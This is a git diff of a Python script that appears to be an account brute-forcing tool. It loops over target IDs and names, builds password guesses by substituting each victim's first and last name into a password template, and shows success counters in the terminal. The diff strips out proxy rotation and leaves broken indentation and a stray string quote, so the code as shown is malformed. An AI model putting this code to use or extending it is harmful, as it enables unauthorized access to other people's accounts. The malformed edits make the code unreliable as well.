@@ -1410,6 +1410,7 @@ def setting():
 	
 #------------[ GMAIL ]--------------#
 #------------[ METHOD 1 ]--------------#
+""""
 proxy_url = 'https://raw.githubusercontent.com/Ramxantanha/data/main/proxies.txt'
 
 try:
@@ -1421,15 +1422,11 @@ try:
         print("Failed to fetch proxies from the provided URL.")
 except requests.RequestException as e:
     print("An error occurred:", e)
-
-def api1(ids, names, passlist, proxies_list):
+    """
+#def api1(ids, names, passlist, proxies_list):
+def api1(ids, names, passlist):
     try:
         global ok, loop, sim_id
-        proxies = proxies_list
-        if not proxies:
-            print("No proxies available.")
-            return
-
         sys.stdout.write('\r\r\033[1;37m [NOT-ANKIT->M1] \x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m]|\033[1;37mOK:-\x1b[38;5;196m[\x1b[37m%s\x1b[38;5;196m] \033[1;37m'%(loop,len(oks)))
         sys.stdout.flush()
         
@@ -1439,9 +1436,9 @@ def api1(ids, names, passlist, proxies_list):
         except:
             ln = fn
         
-        for proxy in proxies:
+       
             session = requests.Session()
-            session.proxies = {'http': proxy, 'https': proxy}
+           
             
             for pw in passlist:
                 pas = pw.replace('first', fn.lower()).replace('First', fn).replace('last', ln.lower()).replace('Last', ln).replace('Name', names).replace('name', names.lower())
@@ -1534,7 +1531,7 @@ def api1(ids, names, passlist, proxies_list):
     except requests.exceptions.ConnectionError:
         time.sleep(20)
     except Exception as e:
-        print('Fuck you')
+        
         pass
 
 # Assuming 'device' and 'ONE' functions are defined elsewhere in your code.
